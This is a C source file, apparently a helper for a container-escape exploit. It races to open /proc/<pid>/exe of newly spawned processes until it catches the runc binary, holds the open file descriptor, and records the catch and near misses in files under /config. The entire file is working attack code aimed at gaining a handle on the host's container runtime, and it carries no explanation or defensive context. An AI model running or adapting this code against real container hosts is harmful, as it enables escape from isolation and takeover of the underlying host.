#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

static int is_pid(const char *s) {
    for (; *s; s++) {
        if (!isdigit((unsigned char)*s)) return 0;
    }
    return 1;
}

static int max_pid_seen(void) {
    int max = 0;
    DIR *d = opendir("/proc");
    if (!d) return 1;
    struct dirent *de;
    while ((de = readdir(d))) {
        if (!is_pid(de->d_name)) continue;
        int pid = atoi(de->d_name);
        if (pid > max) max = pid;
    }
    closedir(d);
    return max;
}

static long ms_since(const struct timespec *start) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    return (now.tv_sec - start->tv_sec) * 1000L + (now.tv_nsec - start->tv_nsec) / 1000000L;
}

int main(int argc, char **argv) {
    int shard = argc > 1 ? atoi(argv[1]) : 0;
    int shards = argc > 2 ? atoi(argv[2]) : 1;
    int base = max_pid_seen() + 1;
    unsigned char done[65536 / 8] = {0};
    unsigned long attempts = 0, opens = 0, misses = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("pid race helper pid=%d base=%d shard=%d/%d\n", getpid(), base, shard, shards);

    for (;;) {
        int max = max_pid_seen();
        if (max + 1 > base + 256) base = max - 64;
        if (base < 1) base = 1;

        for (int pid = base + shard; pid < base + 512; pid += shards) {
            if (pid <= 0 || pid == getpid()) continue;
            if (pid < 65536 && (done[pid / 8] & (1u << (pid % 8)))) continue;

            char exepath[64], link[512];
            snprintf(exepath, sizeof(exepath), "/proc/%d/exe", pid);
            attempts++;
            int fd = open(exepath, O_RDONLY);
            if (fd < 0) {
                if (errno == ENOENT && pid < max - 16 && pid < 65536) done[pid / 8] |= 1u << (pid % 8);
                continue;
            }

            opens++;
            ssize_t r = readlink(exepath, link, sizeof(link) - 1);
            if (r < 0) {
                strcpy(link, "?");
            } else {
                link[r] = 0;
            }

            if (strstr(link, "runc") != NULL || strcmp(link, "?") == 0) {
                int out = open("/config/runc_caught", O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (out >= 0) {
                    dprintf(out, "helper_pid=%d target_pid=%d fd=%d link=%s attempts=%lu opens=%lu\n",
                            getpid(), pid, fd, link, attempts, opens);
                    close(out);
                }
                printf("CAUGHT target=%d fd=%d link=%s attempts=%lu opens=%lu\n", pid, fd, link, attempts, opens);
                for (;;) sleep(60);
            }

            if (misses < 80) {
                int out = open("/config/pid_race_trace", O_WRONLY | O_CREAT | O_APPEND, 0644);
                if (out >= 0) {
                    struct timespec now;
                    clock_gettime(CLOCK_MONOTONIC, &now);
                    dprintf(out, "miss helper=%d target=%d fd=%d link=%s attempts=%lu opens=%lu t=%ld.%09ld\n",
                            getpid(), pid, fd, link, attempts, opens, (long)now.tv_sec, now.tv_nsec);
                    close(out);
                }
                misses++;
            }

            close(fd);
            if (pid < 65536) done[pid / 8] |= 1u << (pid % 8);
        }
    }
}
